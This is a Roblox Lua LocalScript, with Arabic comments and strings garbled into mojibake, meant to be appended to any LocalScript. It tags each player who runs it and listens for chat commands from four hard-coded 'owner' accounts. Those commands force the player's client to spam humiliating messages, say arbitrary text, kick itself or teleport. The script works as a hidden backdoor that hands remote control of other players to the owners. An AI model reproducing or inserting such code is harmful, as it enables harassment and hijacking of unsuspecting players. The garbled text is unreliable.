--// Ø­Ø· Ù‡Ø°Ø§ Ø§Ù„ÙƒÙˆØ¯ ÙÙŠ Ø¢Ø®Ø± Ø£ÙŠ LocalScript
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local pgui = player:WaitForChild("PlayerGui")

player:SetAttribute("ScriptUser", true)

local Owners = {["1il5i"]=true, ["eyad51533"]=true, ["awr_9351156"]=true, ["sj3zx"]=true}

local ChattedEvent = game.ReplicatedStorage:WaitForChild("Events"):WaitForChild("ChattedEvent")
local SendMessage   = game.ReplicatedStorage:WaitForChild("Events"):WaitForChild("SendMessage")

-- Ø¯Ø§Ù„Ø© Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ù„Ø§Ø¹Ø¨ (Ù…Ù† Ø­Ø±ÙÙŠÙ† ÙˆØ£ÙƒØ«Ø±)
local function findTarget(partial)
    if not partial or #partial < 2 then return nil end
    partial = partial:lower()
    for _, p in Players:GetPlayers() do
        if p:GetAttribute("ScriptUser") and (p.Name:lower():find(partial) or p.DisplayName:lower():find(partial)) then
            return p
        end
    end
    return nil
end

-- Ù…ØªØºÙŠÙ‘Ø±Ø§Øª Ø§Ù„Ø³Ø¨Ø§Ù… (Ø±Ø¬Ø¹ØªÙ‡Ø§ Ø¹Ø´Ø§Ù† .3mk Ùˆ .spam ÙŠØ´ØªØºÙ„ÙˆØ§)
local isSpamming = {}
local function startSpamFor(plr, text)
    if isSpamming[plr] then return end
    isSpamming[plr] = true
    spawn(function()
        while isSpamming[plr] do
            SendMessage:FireServer(text)
            task.wait()
        end
    end)
end
local function stopSpamFor(plr) isSpamming[plr] = false end

-- Ø±Ø³Ø§Ù„Ø© Ø§Ù„ØªØ´ØºÙŠÙ„
local gui = Instance.new("ScreenGui", pgui)
gui.ResetOnSpawn = false
local txt = Instance.new("TextLabel", gui)
txt.Size = UDim2.new(0, 800, 0, 120)
txt.Position = UDim2.new(0.5, -400, 0.4, -60)
txt.BackgroundTransparency = 0.4
txt.BackgroundColor3 = Color3.new(0,0,0)
txt.TextColor3 = Color3.new(1,0,0)
txt.TextStrokeTransparency = 0
txt.TextStrokeColor3 = Color3.new(1,1,1)
txt.Font = Enum.Font.GothamBlack
txt.TextSize = 60
txt.Text = "Ø³ÙƒØ±Ø¨Øª Ø§Ù„Ø£ÙˆÙ†Ø±Ø§Øª Ø´ØºØ§Ù„ 100% â˜ ï¸"
task.delay(5, function() gui:Destroy() end)

ChattedEvent.OnClientEvent:Connect(function(senderPlayer, command)
    if not senderPlayer or not Owners[senderPlayer.Name] then return end
    if typeof(command) ~= "string" then return end

    local lower = command:lower()

    -- Ø§Ù„Ø£Ù…Ø± .say Ø§Ù„Ù„ÙŠ ØªØ¨ÙŠÙ‡ (ÙŠØ±Ø³Ù„ Ø§Ù„ÙƒÙ„Ø§Ù… Ø¨Ø§Ù„Ø¶Ø¨Ø· Ø²ÙŠ Ø§Ù„Ù†Ù‚Ø·Ø©)
    if lower:sub(1,5) == ".say " then
        local rest = command:sub(6)
        local targetPart, message = rest:match("^(%S+)%s+(.-)%s*$")
        if not targetPart or not message or message == "" then return end

        local args = { message }

        local function forceSay(plr)
            if plr:GetAttribute("ScriptUser") then
                SendMessage:FireServer(unpack(args))
            end
        end

        if targetPart:lower() == "all" then
            for _, p in Players:GetPlayers() do forceSay(p) end
        else
            local target = findTarget(targetPart)
            if target then forceSay(target) end
        end
        return
    end

    -- Ø¨Ø§Ù‚ÙŠ Ø§Ù„Ø£ÙˆØ§Ù…Ø± (ÙƒÙ„Ù‡Ø§ Ø´ØºØ§Ù„Ø© Ø§Ù„Ø­ÙŠÙ†)
    if lower == ".3mk all" then
        for _, p in Players:GetPlayers() do
            if p:GetAttribute("ScriptUser") then
                startSpamFor(p, "Ø¹Ù…Ù‹Ù‰Ø§Ù†ÙÙŠÙ‹ Ø§ÙˆÙ†Ù‹Ø±Ø§ØªÙ‹ Ø³ÙƒÙ‹Ù‰Ø±Ù‹Ø¨ØªÙ‹ Ø²Ø­ÙÙÙÙÙ ğŸ¥º")
            end
        end

    elseif lower:sub(1,5) == ".3mk " then
        local targetName = command:sub(6):match("^%s*(.-)%s*$")
        local target = findTarget(targetName)
        if target then
            if player == target then
                SendMessage:FireServer(".3mk " .. target.DisplayName)
            end
            startSpamFor(target, "Ø¹Ù…Ù‹Ù‰Ø§Ù†ÙÙŠÙ‹ Ø§ÙˆÙ†Ù‹Ø±Ø§ØªÙ‹ Ø³ÙƒÙ‹Ù‰Ø±Ù‹Ø¨ØªÙ‹ Ø²Ø­ÙÙÙÙÙ ğŸ¥º")
        end

    elseif lower == ".f7lk" or lower == ".f7lk all" then
        SendMessage:FireServer("ÙØ­Ù‹Ù‰Ù‹Ù„Ù‹ÙŠ @"..senderPlayer.DisplayName.." ğŸ¥º")

    elseif lower:sub(1,6) == ".f7lk " then
        local target = findTarget(command:sub(7))
        if target then SendMessage:FireServer("ÙØ­Ù‹Ù‰Ù‹Ù„Ù‹ÙŠ @"..senderPlayer.DisplayName.." ğŸ¥º") end

    elseif lower:sub(1,6) == ".spam " then
        local rest = command:sub(7)
        local targetPart, msg = rest:match("^(%S+)%s+(.*)$")
        if not targetPart then return end
        local spamMsg = msg ~= "" and msg or "Ø§Ù†Ø§ Ø²Ø­Ù ÙˆØ§Ø¹ØªØ±Ù Ø¨Ù…Ù„ÙƒÙŠØ© Ø§Ù„Ø£ÙˆÙ†Ø±Ø§Øª ğŸ¥º"
        if targetPart:lower() == "all" then
            for _, p in Players:GetPlayers() do if p:GetAttribute("ScriptUser") then startSpamFor(p, spamMsg) end end
        else
            local target = findTarget(targetPart)
            if target then startSpamFor(target, spamMsg) end
        end

    elseif lower:sub(1,8) == ".unspam " then
        local targetPart = command:sub(9):match("^%s*(.-)%s*$")
        if not targetPart or #targetPart < 2 then return end
        if targetPart:lower() == "all" then
            for _, p in Players:GetPlayers() do if p:GetAttribute("ScriptUser") then stopSpamFor(p) end end
        else
            local target = findTarget(targetPart)
            if target then stopSpamFor(target) end
        end

    -- Ø¨Ø§Ù‚ÙŠ Ø§Ù„Ø£ÙˆØ§Ù…Ø± (.kick Ùˆ .bring) Ø´ØºØ§Ù„Ø© Ø²ÙŠ Ø§Ù„Ø£ÙˆÙ„
    elseif lower:sub(1,6) == ".kick " then
        local rest = command:sub(7)
        local targetStr, reason = rest:match("^%s*(%S+)%s*(.*)$")
        if not targetStr then return end
        reason = (#reason > 0) and reason or "ØªÙ… Ø·Ø±Ø¯Ùƒ Ø¨ÙˆØ§Ø³Ø·Ø© Ø§Ù„Ø£ÙˆÙ†Ø±Ø§Øª"
        if targetStr:lower() == "all" then
            for _, p in Players:GetPlayers() do if p:GetAttribute("ScriptUser") then p:Kick(reason) end end
        else
            local target = findTarget(targetStr)
            if target then target:Kick(reason) end
        end

    elseif lower:sub(1,7) == ".bring " then
        local targetName = command:sub(8):match("^%s*(.-)%s*$")
        if not targetName or #targetName < 2 then return end
        if targetName:lower() == "all" then
            for _, p in Players:GetPlayers() do
                if p.Character and p.Character:FindFirstChild("HumanoidRootPart") and p:GetAttribute("ScriptUser") then
                    p.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(3,0,3)
                end
            end
        else
            local target = findTarget(targetName)
            if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
                target.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(3,0,3)
            end
        end
    end
end)
